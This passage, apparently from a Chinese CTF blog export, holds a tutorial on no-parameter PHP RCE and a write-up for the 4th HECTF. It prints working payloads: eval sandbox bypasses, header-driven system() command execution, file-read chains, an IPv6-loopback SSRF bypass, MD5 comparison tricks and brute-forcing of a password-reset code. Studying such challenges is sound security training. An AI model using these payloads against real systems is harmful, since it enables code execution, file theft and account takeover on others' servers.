end=&#x27;&#x27;)","categories":[{"name":"信息安全","slug":"信息安全","permalink":"https://flag2020.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://flag2020.top/tags/misc/"}]},{"title":"无参数RCE","slug":"无参数RCE","date":"2020-12-02T16:00:00.000Z","updated":"2020-12-23T14:34:00.260Z","comments":true,"path":"2020/12/03/无参数RCE/","link":"","permalink":"https://flag2020.top/2020/12/03/%E6%97%A0%E5%8F%82%E6%95%B0RCE/","excerpt":"无参数RCE：就是只使用函数，且函数不能带有参数 123456&lt;?phphighlight_file(__FILE__);if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; eval($_GET[&#x27;code&#x27;]);&#125;?&gt;","text":"无参数RCE：就是只使用函数，且函数不能带有参数 123456&lt;?phphighlight_file(__FILE__);if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; eval($_GET[&#x27;code&#x27;]);&#125;?&gt; 代码分析preg_replace() 语法： 1mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) pattern：要搜索的模式，可以是字符串或一个字符串数组 replacement：用于替换的字符串或字符串数组 subject：要搜索替换的目标字符串或字符串数组 limit：可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制） count：可选，为替换执行的次数 简化为： 1preg_replace(pattern, replacement, subject) 即：将subject中符合pattern的替换为replacement 对于preg_replace(&#39;/[^\\W]+\\((?R)?\\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;]) 意思是，对传进来的code进行正则匹配，符合正则表达式的部分替换为空，然后返回一个新的字符串 正则表达式正则表达式（Regular Expression）描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。 正则表达式 – 语法 | 菜鸟教程 (runoob.com) 123456789&lt;?php$str=&#x27;01ABcdEf_230G&#x27;;echo preg_replace(&#x27;/0/&#x27;, &#x27;A&#x27;, $str).&#x27;&lt;br&gt;&#x27;; //将0换成Aecho preg_replace(&#x27;/[0-9]/&#x27;, &#x27;&#x27;, $str).&#x27;&lt;br&gt;&#x27;; //去掉所有数字echo preg_replace(&#x27;/[a-z]/&#x27;, &#x27;&#x27;, $str).&#x27;&lt;br&gt;&#x27;; //去掉所有小写字母echo preg_replace(&#x27;/[A-Z]/&#x27;, &#x27;&#x27;, $str).&#x27;&lt;br&gt;&#x27;; //去掉所有大写字母echo preg_replace(&#x27;/[^A-Z]/&#x27;, &#x27;&#x27;, $str).&#x27;&lt;br&gt;&#x27;; //去掉除了大写字母外所有的字符echo preg_replace(&#x27;/[a-z A-Z]/&#x27;, &#x27;&#x27;, $str).&#x27;&lt;br&gt;&#x27;; //去掉所有大小写字母?&gt; A1ABcdEf_23AGABcdEf_G01ABE_230G01cdf_230ABEG01_230 123456&lt;?php$a = &quot;abcABC123_+-*/&quot;;echo preg_replace(&#x27;/[\\w]/&#x27;, &#x27;!&#x27;, $a).&quot;&lt;br&gt;&quot;;echo preg_replace(&#x27;/[\\W]/&#x27;, &#x27;!&#x27;, $a).&quot;&lt;hr&gt;&quot;;echo preg_replace(&#x27;/[^\\W]/&#x27;, &#x27;!&#x27;, $a).&quot;&lt;br&gt;&quot;;?&gt; !!!!!!!!!!+-/abcABC123_!!!!!!!!!!!!!!+-/ \\w：匹配字母、数字、下划线。等价于[A-Z a-z 0-9 _] \\W：匹配非字母、数字、下划线。等价于[^A-Z a-z 0-9 _] 而(?R)是引用当前表达式的意思，即可以用/[^\\W]+\\((?R)?\\)/替换到(?R)的位置 (?R)? 这里多一个?表示可以有引用，也就是说可以衍生匹配。 即：(?R)?表示递归整个匹配模式 所以/[^\\W]+\\((?R)?\\)/合起来就是匹配无参数的函数，函数内部可以无限嵌套相同的模式，也就是说只匹配字符串+()的类型，并且括号内为空字符串或字符串+()。 总结所以对于preg_replace(&#39;/[^\\W]+\\((?R)?\\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;]) 像fun1(fun2(fun3()))最终会被替换为空 而fun1(fun2(fun3(aaa)))则不会进行替换，结果仍为fun1(fun2(fun3(aaa))) 常用函数show_source()扩展：highlight_file() 高亮读取文件 12show_source()函数对文件进行语法高亮提示show_source(filename,return) 参数 描述 filename 必需。要进行高亮处理的 PHP 文件的路径。 return 可选。如果设置 true，则本函数返回高亮处理的代码。 test.php 1234&lt;?phpecho __FILE__.&#x27;&lt;br&gt;&#x27;;show_source(__FILE__).&quot;&lt;hr&gt;&quot;;?&gt; localeconv()localeconv() 函数返回一包含本地数字及货币格式信息的数组，且第一个元素为点（.)。 localeconv() 函数会返回以下数组元素： [decimal_point] - 小数点字符 [thousands_sep] - 千位分隔符 [int_curr_symbol] - 货币符号 （例如：USD） [currency_symbol] - 货币符号 （例如：$） [mon_decimal_point] - 货币小数点字符 [mon_thousands_sep] - 货币千位分隔符 [positive_sign] - 正值字符 [negative_sign] - 负值字符 [int_frac_digits] - 国际通用小数位 [frac_digits] - 本地通用小数位 123&lt;?phpvar_dump(localeconv());?&gt; array(18) { [“decimal_point”]=&gt; string(1) “.” [“thousands_sep”]=&gt; string(0) “” [“int_curr_symbol”]=&gt; string(0) “” [“currency_symbol”]=&gt; string(0) “” [“mon_decimal_point”]=&gt; string(0) “” [“mon_thousands_sep”]=&gt; string(0) “” [“positive_sign”]=&gt; string(0) “” [“negative_sign”]=&gt; string(0) “” [“int_frac_digits”]=&gt; int(127) [“frac_digits”]=&gt; int(127) [“p_cs_precedes”]=&gt; int(127) [“p_sep_by_space”]=&gt; int(127) [“n_cs_precedes”]=&gt; int(127) [“n_sep_by_space”]=&gt; int(127) [“p_sign_posn”]=&gt; int(127) [“n_sign_posn”]=&gt; int(127) [“grouping”]=&gt; array(0) { } [“mon_grouping”]=&gt; array(0) { }} pos()pos() 函数返回数组中的当前元素的值（取第一个元素）。 该函数是 current() 函数的别名。 如果pos()和current()都被过滤了，可以使用reset()。 每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。 相关的方法： current() - 返回数组中的当前元素的值 end() - 将内部指针指向数组中的最后一个元素，并输出 next() - 将内部指针指向数组中的下一个元素，并输出 prev() - 将内部指针指向数组中的上一个元素，并输出 reset() - 将内部指针指向数组中的第一个元素，并输出 each() - 返回当前元素的键名和键值，并将内部指针向前移动 scandir()scandir() 函数返回指定目录中的文件和目录的数组。 1scandir(directory,sorting_order,context); 参数 描述 directory 必需。规定要扫描的目录。 sorting_order 可选。规定排列顺序。默认是 0，表示按字母升序排列。如果设置为 SCANDIR_SORT_DESCENDING 或者 1，则表示按字母降序排列。如果设置为 SCANDIR_SORT_NONE，则返回未排列的结果。 context 可选。规定目录句柄的环境。context 是可修改目录流的行为的一套选项。 123&lt;?phpvar_dump(scandir(&#x27;D:\\ant&#x27;));?&gt; chr()chr() 函数从指定的 ASCII 值返回字符。 ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x； 12345&lt;?phpecho chr(61) . &quot;&lt;br&gt;&quot;; // 十进制echo chr(061) . &quot;&lt;br&gt;&quot;; // 八进制值echo chr(0x61) . &quot;&lt;br&gt;&quot;; // 十六进制值?&gt; =1a chdir()chdir() 函数当参数为两个点的时候能够跳转到上层目录，相当于在命令行输入cd..会返回上一级目录。 DOS的Chdir（cd）命令可以显示当前目录的名称或者更改当前的目录。 一般当前显示的路径是”C:\\Users\\Administrator”，如果想要跳转到D盘的Test文件夹(“D:\\test\\”)可以直接使用DOS命令cd /d d:\\test 如果想要跳转到当前路径的上一级路径可以直接用DOS命令cd .. 如果想要获取cd命令的具体用法，可以直接输入cd /? 1234567&lt;?phpecho getcwd().&quot;&lt;br&gt;&quot;;chdir(&quot;app&quot;);echo getcwd().&quot;&lt;br&gt;&quot;;chdir(&quot;..&quot;);echo getcwd().&quot;&lt;br&gt;&quot;;?&gt; D:\\phpStudy\\PHPTutorial\\WWWD:\\phpStudy\\PHPTutorial\\WWW\\appD:\\phpStudy\\PHPTutorial\\WWW localtime()1localtime(timestamp,is_assoc); 参数 描述 timestamp 可选。规定 Unix 时间戳。如果未规定 timestamp，则默认为当前的本地时间 time()。 is_assoc 可选。规定返回关联数组还是索引数组。如果为 FALSE，则返回索引数组。如果为 TRUE，则返回关联数组。默认为 FALSE。关联数组的键名如下：[tm_sec] - 秒数[tm_min] - 分钟数[tm_hour] - 小时[tm_mday] - 月份中的第几天[tm_mon] - 年份中的第几个月，从 0 开始表示一月份[tm_year] - 年份，从 1900 开始[tm_wday] - 星期中的第几天 (Sunday=0)[tm_yday] - 年中的第几天[tm_isdst] - 夏令时当前是否生效 例子1234567&lt;?phpif(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; eval($_GET[&#x27;code&#x27;]);&#125; else &#123; show_source(__FILE__);&#125;?&gt; 方法一可以利用eval()读取目录 用scandir()读取目录源码，但必须带有参数（’.’），无法通过正则匹配 123&lt;?phpvar_dump(scandir(&#x27;.&#x27;));?&gt; 用pos()取localeconv()返回的数组的第一个元素，也就是”.” 123&lt;?phpvar_dump(scandir(pos(localeconv())));?&gt; code.php?code=var_dump(scandir(pos(localeconv()))); 用end()选择最后一个文件并用readfile()读取 code.php?code=var_dump(readfile(end(scandir(pos(localeconv()))))); readfile() 输出一个文件 show_source() 与 echo(readfile())效果一样，可代替使用。 方法二利用当前秒数构造点 ，利用localtime()中返回的秒数来构造点，点的aiisc码正好是46在60秒之内，我们只需等到46秒时候就能将点给构造出来。 chr(current(localtime(time()))) 利用chr(46)就是字符. 数组第一个值每秒+1，所以最多60秒就一定能得到46 1var_dump(chr(pos(localtime()))); 最终payload 1http:&#x2F;&#x2F;39.107.126.173:8080&#x2F;code&#x2F;code.php? code&#x3D;var_dump(readfile(end(scandir(chr(pos(localtime())))))); 方法三利用SESSIONID来传参 1show_source(session_id(session_start())); 在cookie处传参 1PHPSESSID&#x3D;flag.php 方法四利用 getallheaders() 来获取参数RCE 1echo(system(end(getallheaders()))); 在最后在最后一条请求头添加 1cat flag.php 读取目录文件 如果文件是最后一个，可以用 show_source(end(scandir(getcwd()))); 或者用readfile()、highlight_file()、file_get_contents()、readgzfile()等读文件函数 如果文件是倒数第二个，可以用 show_source(next(array_reverse(scandir(getcwd())))); array_reverse()以相反的元素顺序返回数组 如果不是数组的最后一个或者倒数第二个，可以用 show_source(array_rand(array_flip(scandir(getcwd())))); 或者： show_source(array_rand(array_flip(scandir(current(localeconv()))))); array_flip()函数会交换数组的键名和键值，array_rand()函数会返回数组中的随机键名 跳转目录情况 假设ﬂag在上层目录文件的情况，我们需要跳转到上层目录。 chdir() 函数当参数为两个点的时候能够跳转到上层目录。scandir() ，读取当前目录在第二个元素就能读取两个点 localtime第一个参数是时间戳，所以我们不能直接嵌套，需要带一个time函数作为嵌套、time函数能够返回时间戳 构造读取上层目录payload 1echo(implode(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))); 构造读取上层目录文件payload 1echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))); 其它小技巧 利用chr(46)就是字符. phpversion()会返回php版本，如5.6.27 floor(phpversion())返回5 sqrt(floor(phpversion()))返回2.2360679774998 tan(floor(sqrt(floor(phpversion()))))返回-2.1850398632615 cosh(tan(floor(sqrt(floor(phpversion())))))返回4.5017381103491 sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))返回45.081318677156 ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))返回46 即：chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))等于. 利用三角函数构造斜杠 1chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile()))))))))); 利用随机令牌构造点 1echo(implode(scandir(chr(strrev(uniqid()))))); 查看上一级目录文件名 1print_r(scandir(dirname(getcwd()))); 1print_r(scandir(next(scandir(getcwd())))); 题目12345678910111213141516&lt;?php//flag in flag.php$a=&quot;&quot;;if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; if(preg_match(&quot;/ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print/i&quot;, $_GET[&#x27;code&#x27;]))&#123; die(&quot;no no no !&quot;); &#125; eval(&quot;\\$a=&quot;.$_GET[&#x27;code&#x27;]); if(preg_match(&#x27;/flag/&#x27;, $a))&#123; die(&quot;no&quot;); &#125; echo($a);&#125; else &#123; show_source(__FILE__);&#125;?&gt; 代码分析首先对传进来的code进行过滤，若是通过替换后为;，则能通过第一个if判断语句，所以要套娃嵌套 第二个if语句对危险函数进行过滤，包括大小写，所以只能用没被过滤的函数来构造payload eval()语句执行传进来的code，然后赋值给$a 第三个if语句对$a进行匹配，如果含有flag，则die掉 绕过了前面3个if语句，则通过echo($a)，将code执行后的结果输出 构造payload用file_get_contents()将整个文件读入一个字符串，利用eval()赋值给$a，最后通过echo()打印出来 因为不知道flag.php的位置，且过滤掉很多函数，如：end()、next()等 所以用array_rand(array_flip())来获取一个随机的文件名 合起来就是 1file_get_contents(array_rand(array_flip(scandir(current(localeconv()))))); 但后边对$a进行正则匹配，过滤了flag，所以要对读取的文件内容加密，由于过滤了base64，所以选择用十六进制加密，得到最终payload 1bin2hex(file_get_contents(array_rand(array_flip(scandir(current(localeconv())))))); 因为是随机读取，所以要多刷新几次，然后解密看看 12&lt;?phpecho hex2bin(&quot;3c3f7068700d0a2f2f666c61677b36643633333362392d353564302d343266312d613236642d3663666439663361666238657d0d0a3f3e&quot;);","categories":[{"name":"信息安全","slug":"信息安全","permalink":"https://flag2020.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"}]},{"title":"第四届HECTF write up","slug":"第四届HECTF write up","date":"2020-11-22T13:00:00.000Z","updated":"2020-11-26T07:57:26.747Z","comments":true,"path":"2020/11/22/第四届HECTF write up/","link":"","permalink":"https://flag2020.top/2020/11/22/%E7%AC%AC%E5%9B%9B%E5%B1%8AHECTF%20write%20up/","excerpt":"Webezphp题目：蛾子！你怎么跑到了。。。。php上？ 123456789101112131415161718192021222324252627282930313233&lt;?php error_reporting(0);highlight_file(__file__);include(&#x27;flag.php&#x27;); $string_1 = $_GET[&#x27;str1&#x27;]; $string_2 = $_GET[&#x27;str2&#x27;]; if($_GET[&#x27;param1&#x27;]!==$_GET[&#x27;param2&#x27;]&amp;&amp;md5($_GET[&#x27;param1&#x27;])===md5($_GET[&#x27;param2&#x27;]))&#123; if(is_numeric($string_1))&#123; $md5_1 = md5($string_1); $md5_2 = md5($string_2); if($md5_1 != $md5_2)&#123; $a = strtr($md5_1, &#x27;cxhp&#x27;, &#x27;0123&#x27;); $b = strtr($md5_2, &#x27;cxhp&#x27;, &#x27;0123&#x27;); if($a == $b)&#123; echo $flag; &#125; else &#123; die(&#x27;you are close&#x27;); &#125; &#125; else &#123; die(&quot;md5 is wrong&quot;); &#125; &#125; else &#123; die(&#x27;str1 not number&#x27;); &#125;&#125;else &#123; die(&#x27;you are wrong!&#x27;);&#125;?&gt;","text":"Webezphp题目：蛾子！你怎么跑到了。。。。php上？ 123456789101112131415161718192021222324252627282930313233&lt;?php error_reporting(0);highlight_file(__file__);include(&#x27;flag.php&#x27;); $string_1 = $_GET[&#x27;str1&#x27;]; $string_2 = $_GET[&#x27;str2&#x27;]; if($_GET[&#x27;param1&#x27;]!==$_GET[&#x27;param2&#x27;]&amp;&amp;md5($_GET[&#x27;param1&#x27;])===md5($_GET[&#x27;param2&#x27;]))&#123; if(is_numeric($string_1))&#123; $md5_1 = md5($string_1); $md5_2 = md5($string_2); if($md5_1 != $md5_2)&#123; $a = strtr($md5_1, &#x27;cxhp&#x27;, &#x27;0123&#x27;); $b = strtr($md5_2, &#x27;cxhp&#x27;, &#x27;0123&#x27;); if($a == $b)&#123; echo $flag; &#125; else &#123; die(&#x27;you are close&#x27;); &#125; &#125; else &#123; die(&quot;md5 is wrong&quot;); &#125; &#125; else &#123; die(&#x27;str1 not number&#x27;); &#125;&#125;else &#123; die(&#x27;you are wrong!&#x27;);&#125;?&gt; 利用md5()不能加密数组，加密数组会返回false，所以param1和param2传值为 1param1[]&#x3D;1&amp;param2[]&#x3D;2 接下要使得传进来的str1是纯数字，且str1和str2进行md5加密后的值不相等 然后对md5加密后的值进行替换后相等，最终得到flag 只要是以0e开头，后面为数字的两个字符串相等，所以 $a == $b这里可以考虑这样绕过 纯数字的字符串md5加密后符合**0e\\d+**的有240610708，即 1str1&#x3D;240610708 因为在后面的替换中，会将c替换为0，所以str2进行md5加密后得以ce开头，这样才能使得str1和str2md5加密后的值不相等，替换后又能相等 而str2进行md5加密后，除开头的ce外，剩下部分只能是数字和字母cxhp 写脚本进行筛选 1234567891011&lt;?phpfor ($i=0; $i&lt;10000000; $i++) &#123; $a = md5($i); if(substr($a, 0, 2) == &#x27;ce&#x27;) &#123; $end = substr($a, 2); if(!preg_match(&#x27;/[^0-9cxhp]/&#x27;, $end)) &#123; echo &quot;i=&quot;.$i.&#x27;&lt;br&gt;&#x27;; echo &quot;a=&quot;.$a.&#x27;&lt;br&gt;&#x27;; &#125; &#125;&#125; 12i&#x3D;9427417a&#x3D;ce156443c7c7c4c63366466c25317636 所以str2=9427417 联合起来即 1?str1&#x3D;240610708&amp;str2&#x3D;9427417&amp;param1[]&#x3D;1&amp;param2[]&#x3D;2 签到题目：登录就送flag~ hint：brute force 随便输个手机号和密码，提示手机或密码错误，查看源码发现手机号：15970773575 点击忘记密码，根据题目hint，使用暴力破解 用脚本生成4位纯数字的验证码 4num.py 12345for i in range(0000,9999): s = str(i).zfill(4) with open(&#x27;4num.txt&#x27;,&quot;a&quot;) as f: f.write(str(s) + &quot;\\n&quot;) f.close() 用burp suite抓包，使用爆破模块进行爆破，其中0233的长度和其它明显不同 尝试后发现为正确的验证码，重设密码后重新登录即可拿到flag 1HECTF&#123;a9a102c0c06fcf6c8072c30f0a52f1f2&#125; ssrfme题目：绕过人海，走进服务器内心的世界。 1234567891011121314151617181920212223242526272829&lt;?phperror_reporting(0);highlight_file(__FILE__);//try flag.phpfunction filter($url) &#123; $match_result=preg_match(&#x27;/^(http|https)?:\\/\\/.*(\\/)?.*$/&#x27;,$url); if (!$match_result) &#123; die(&#x27;url fomat error&#x27;); &#125; try &#123; $url_parse=parse_url($url); &#125; catch(Exception $e) &#123; die(&#x27;url fomat error&#x27;); return false; &#125; $hostname=$url_parse[&#x27;host&#x27;]; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long(&#x27;127.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;10.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;172.16.0.0&#x27;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#x27;192.168.0.0&#x27;)&gt;&gt;16 == $int_ip&gt;&gt;16; &#125; $url = $_GET[&#x27;url&#x27;];if(!filter($url))&#123; echo file_get_contents($url);&#125;?&gt; 参考：【转载】浅谈ssrf与ctf那些事 | kawhi’s Blog (getflag.cn) 1?url&#x3D;http:&#x2F;&#x2F;[0:0:0:0:0:ffff:127.0.0.1]&#x2F;flag.php misc【真签到题】快来看直播啦~题目：前往直播间，调戏小蓝蓝获取flag。 flag在直播屏幕里 1HECTF&#123;狮虎萌轻一点打出题人好吗嘤嘤嘤&#125; png题目：好可爱的小猫咪鸭~ 下载后是一张图片：flag.png 拖到010 Editor里，在末尾发现这个 1M2I3OWJkZjhmY2ZkNTVmZH0&#x3D; base64解密后得到 13b79bdf8fcfd55fd&#125; 差了前半段，尝试调整图片高度，将02 BC改为04 20 在图片最下看到前半段的flag 合起来得到flag 1flag&#123;94ed7fdae8f504743b79bdf8fcfd55fd&#125; 不说人话题目：阴阳怪气？！ 使用Ook编解码在线工具，得到flag 1HECTF&#123;TH1s_1s_crypt0_914nda0&#125; 复现参考：https://mp.weixin.qq.com/s/SWjgzRRm8-RKCRRSrLYbRw web1题目：Sunned是一个linux小白，突然有一天想学渗透，她请教了某大佬，大佬说，首先的你得先学会搭建环境，然后，然后，Sunned就跟着网上的教程先搭建了一个web服务器，搭建好之后大佬给她上了一个题目。 hint：一个小姑娘走丢了，她的家人担心地到处找，一边找一边喊：贝丝！你在哪？？ L2V0Yy9jcm9udGFi 查看源码发现 php弱类型比较问题，利用md5不能加密数组绕过 1a[]&#x3D;1&amp;b[]&#x3D;2 得到： 1You need the file is .&#x2F;3b8cf4731c36d20776c76e20f9c774c7.php 访问该路径 1234567891011&lt;html&gt;@$data&#x3D;$_POST[&#39;data&#39;];$file&#x3D;$_POST[&#39;file&#39;];if($file!&#x3D;&quot;&#x2F;xxx&quot;)die(&quot;你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径&quot;);if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\\W]+\\((?R)?\\)&#x2F;&#39;, &#39;&#39;, $data)) &#123;echo &quot;great!!!!你需要看看源码&quot;;file_put_contents($file,&quot;&quot;);&#125;你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径 根据提示的L2V0Yy9jcm9udGFi，进行base64解码，得到 1&#x2F;etc&#x2F;crontab 访问该路径 尝试传参，并访问 1data&#x3D;phpinfo();&amp;file&#x3D;&#x2F;very_g00d_Y0u_got_it.php get_defined_vars() 会返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。 12345678910111213141516171819&lt;?phpvar_dump(get_defined_vars());/*array(4) &#123; [&quot;_GET&quot;]=&gt; array(0) &#123; &#125; [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]=&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125;&#125;*/?&gt; 1data&#x3D;eval(pos(next(get_defined_vars())));&amp;file&#x3D;&#x2F;very_g00d_Y0u_got_it.php 或： data=eval(end(current(get_defined_vars())));&amp;file=/very_g00d_Y0u_got_it.php 执行命令 Zmw0Z2dnZ2dnZ2dnZ2dnCg base64解密后为 fl4ggggggggggggCg 也可以读取3b8cf4731c36d20776c76e20f9c774c7.php，从注释知道flag所在文件 读取Zmw0Z2dnZ2dnZ2dnZ2dnCg，得到flag 3b8cf4731c36d20776c76e20f9c774c7.php 源码： 123456789101112131415161718192021222324252627&lt;html&gt;@$data=$_POST[&#x27;data&#x27;];$file=$_POST[&#x27;file&#x27;];if($file!=&quot;/xxx&quot;)die(&quot;你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径&quot;);if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $data)) &#123;echo &quot;great!!!!你需要看看源码&quot;;file_put_contents($file,&quot;&lt;?php &quot;.\\$data.&quot; ?&gt;&quot;);&#125;&lt;?php@$data=$_POST[&#x27;data&#x27;];$file=$_POST[&#x27;file&#x27;];if($file!=&quot;/very_g00d_Y0u_got_it.php&quot;) die(&quot;你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径&quot;);if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $data)) die(&quot;nonono &quot;);if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $data)) &#123; echo &quot;great!!!!&quot;; @file_put_contents($file,&quot;&lt;?php &quot;.$data.&quot; ?&gt;&quot;); //你想要的文件是 Zmw0Z2dnZ2dnZ2dnZ2dnCg&#125;?&gt;&lt;/html&gt;&gt; 在这里签到题目：经典套娃 有手就… enc.txt 1U2FsdGVkX18DxoLgtTzVee++9JZw790ngjGfxdjjjeWt9m9jL2O3NJuKB&#x2F;&#x2F;4O3BHTnelg2z+o2vE0AxVKPobIFVgKxqbpkr94XYPNZFbbFykHWBMArdVT8FuH7dyvHDrLe7D35p654UEy2Yn0FepbJ7BHcn9Gu9xg7eqVcovB6KfMivcXw49JyZWbWtb0SZKpA0hRgI2tNeQ8lsRZRkoaI9CECyphItxLd0bO58phQjv70M&#x2F;e30tsFpEmPo&#x3D; rabbit解密 1R1E0RElOSlVHTTJUSU5CV0c1QkRHTkJUR01aVFFOUlRHWTJER05SVEdVWlRJTlJVR1laVEdPQlRHVTNES05SVkdZWlRHTkpUR0kzREdOUlZHWTJETU1KV0dJWlRJTVpaR1kyREdNWldHUVpURU5SV0dNM1RNTkpXR0UzVUk9PT0&#x3D; base64解密 1GQ4DINJUGM2TINBWG5BDGNBTGMZTQNRTGY2DGNRTGUZTINRUGYZTGOBTGU3DKNRVGYZTGNJTGI3DGNRVGY2DMMJWGIZTIMZZGY2DGMZWGQZTENRWGM3TMNJWGE3UI&#x3D;&#x3D;&#x3D; base32解密 148454354467B34333863643635346463383565656335326365646162343964336432663765617D 十六进制转字符串 1HECTF&#123;438cd654dc85eec52cedab49d3d2f7ea&#125; rsa题目：RRRRRRRSSSSSSSSAAAAAAA~ rsa.txt 123n &#x3D; 11419768903339716189261532371559705252086398275876008505047375123074727093589680611869748263351554093957968142343831331654606932684767042958427409579115435445187908134556329979271179879129295667476493886787230948520371350715808988496083694717544298343260369816980228394498856751096191942011545898984240281874509791880690092840536597771674772617299407710771426964764347566008897012753022763270832647775571317162594044338095870404550665457899223394942640876850692848671826594750236910363027949459768124646230555766323417693441861436560072288812137944884954974348317322412816157152702695143094487806945533233359294549423e &#x3D; 65537c &#x3D; 575061710950381118206735073806398116370706587076775765253483131078316908073202143802386128272374323616239083134747318254436706806781744501903333604772961927966747648954315962269321297121495398057938617145017999482722197661065698707836824505023856306403892307944203245563411961302499347604417024064678999003637933185177922884103362203639349298263339808508185861692596967147081382566246627668898774233029198694500565511361867375668367875805985660705137109665107860799277624050210666866958502948062330037309873148963011192405012811945540153592090345668265964477204465327474208098404082920129178960510763496025906621820 首先分解p、q，使用http://factordb.com/在线解密 12345678910import gmpy2n = 11419768903339716189261532371559705252086398275876008505047375123074727093589680611869748263351554093957968142343831331654606932684767042958427409579115435445187908134556329979271179879129295667476493886787230948520371350715808988496083694717544298343260369816980228394498856751096191942011545898984240281874509791880690092840536597771674772617299407710771426964764347566008897012753022763270832647775571317162594044338095870404550665457899223394942640876850692848671826594750236910363027949459768124646230555766323417693441861436560072288812137944884954974348317322412816157152702695143094487806945533233359294549423e = 65537c = 575061710950381118206735073806398116370706587076775765253483131078316908073202143802386128272374323616239083134747318254436706806781744501903333604772961927966747648954315962269321297121495398057938617145017999482722197661065698707836824505023856306403892307944203245563411961302499347604417024064678999003637933185177922884103362203639349298263339808508185861692596967147081382566246627668898774233029198694500565511361867375668367875805985660705137109665107860799277624050210666866958502948062330037309873148963011192405012811945540153592090345668265964477204465327474208098404082920129178960510763496025906621820p = 2499568793q = 4568695582742345507136251229217400959960856046691733722988345503429689799935696593516299458516865110324638359470761456115925725067558499862591063153473862179550706262380644940013531317571260647226561004191266100720745936563550699000939117068559232225644277283541933064331891245169739139886735615435506152070330233107807124410892978280063993668726927377177983100529270996547002022341628251905780873531481682713820809147098305289391835297208890779643623465917824350382592808578978330348769060448006691307027594085634520759293965723855183484366752511654099121387261343686017189426761536281948007104498017003911phi = (p-1) * (q-1)d = gmpy2.invert(e, phi)m = pow(c, d, n)print(libnum.n2s(m)) 1flag&#123;8fb873baba0df4a6423be9f4bd525d93&#125; no blank space题目：出题人的电脑年久失修，空格键失灵了，你能找到电报里的秘密吗(注:flag内字母全部大写） flag格式：HECTF{.+} hint：试试别的电报码叭 hint：古老的5bit编码 cipher.txt 1.-.------.-...-.-----..-..----.-.--..-...-........--.-...-...-........--.-.-..--.----...--..-...-..-.....-.-.---.-...-..----. 博多码 将.换成1，-换成0 123456&lt;?php$a = &#x27;.-.------.-...-.-----..-..----.-.--..-...-........--.-...-...-........--.-.-..--.----...--..-...-..-.....-.-.---.-...-..----.&#x27;;$a = str_replace(&#x27;.&#x27;, &#x27;1&#x27;, $a);$a = str_replace(&#x27;-&#x27;, &#x27;0&#x27;, $a);echo $a;?&gt; 110100000010111010000011011000010100110111011111111001011101110111111110010101100100001110011011101101111101010001011101100001 用这个网站解码：Baudot Code, Baudot-Murray Code (online tool) | Boxentriq 1HECTFTH1S1SNTM0RS3 整理下得到flag 1HECTF&#123;TH1S1SNTM0RS3&#125; 也可以一个一个对照解码 1234567891011121314151617181920212223242510100 H00001 E01110 C10000 T01101 F10000 T10100 H11011 切换到数字10111 111111 切换到字母00101 S11011 切换到数字10111 111111 切换到字母00101 S01100 N10000 T11100 M11011 切换到数字10110 011111 切换到字母01010 R00101 S11011 切换到数字00001 3 希尔密码题目：出题人想悄悄送给大家flag，flag就是HECTF{ezth……（糟糕,小哲哲师傅突然堵住了我的嘴 hint：已知部分明文，不如试试解出key叭 hint：hectf 原来这是五个字 cipher.txt 1cdqsrppwuzzyjhwrhyzripfpxol 